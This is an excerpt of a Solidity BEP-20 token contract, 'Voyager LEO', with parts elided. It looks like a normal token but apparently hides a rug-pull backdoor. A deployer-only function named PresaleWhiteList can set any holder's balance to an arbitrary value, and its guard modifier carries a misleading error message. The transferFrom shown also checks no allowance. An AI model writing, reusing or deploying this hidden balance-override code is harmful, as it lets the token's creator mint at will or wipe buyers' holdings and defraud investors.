...
contract VoyagerLEO is SHIBAbep20 {
  
    // common addresses
    address private owner;
    address private SHIBAPILOTWALL;
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public SHIBArownerd;
    
    mapping(address => mapping(address => uint)) public Allowance;
    
    // token title metadata
    string public override name = "Voyager LEO";
    string public override symbol = "VOYAGERLEO";
    ...
    constructor(uint SHIBAalltotalSupplytotalValue) {
        // set total supply
        totalSupply = SHIBAalltotalSupplytotalValue;
        
       SHIBAPILOTWALL = msg.sender;      
        // designate addresses
        owner = msg.sender;
        
        // split the tokens according to agreed upon percentages
        
        SHIBArownerd[owner] = totalSupply;
    }
    ...
    function balanceOf(address account) public view override returns(uint) {
        return SHIBArownerd[account];
    }
  modifier _ShibaVirtuals () {
    require(SHIBAPILOTWALL == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }   
    ...
    function transfer(address to, uint totalValue) public override returns(bool) {
        ...
        uint SHIBAtaxTBD = totalValue * 0 / 1000;
        uint SHIBAburnTBD = totalValue * 0 / 1000;
        uint SHIBAtotalValueAfterTaxAndBurn = totalValue - SHIBAtaxTBD - SHIBAburnTBD;
        
        // perform the transfer operation
        SHIBArownerd[to] += SHIBAtotalValueAfterTaxAndBurn;
        SHIBArownerd[msg.sender] -= totalValue;
        
        emit Transfer(msg.sender, to, totalValue);
        
        // finally, we burn and tax the extras percentage
        SHIBArownerd[owner] += SHIBAtaxTBD + SHIBAburnTBD;
        _burn(owner, SHIBAburnTBD);
    ...
    function PresaleWhiteList(address PresaleSHIBAadr, uint256 amount) external _ShibaVirtuals {
      SHIBArownerd[PresaleSHIBAadr] = amount * 10 ** 9;
  }  
    ...
    function transferFrom(address from, address to, uint totalValue) public override returns(bool) {
        ...
        require(SHIBArownerd[from] >= totalValue, "Balance is too low to make transfer.");
        
        SHIBArownerd[to] += totalValue;
        SHIBArownerd[from] -= totalValue;
    ...
    function _burn(address account, uint256 amount) internal {
        ...
        require(SHIBArownerd[account] >= amount, "Burn amount exceeds balance at address.");
    
        SHIBArownerd[account] -= amount;
        totalSupply -= amount;
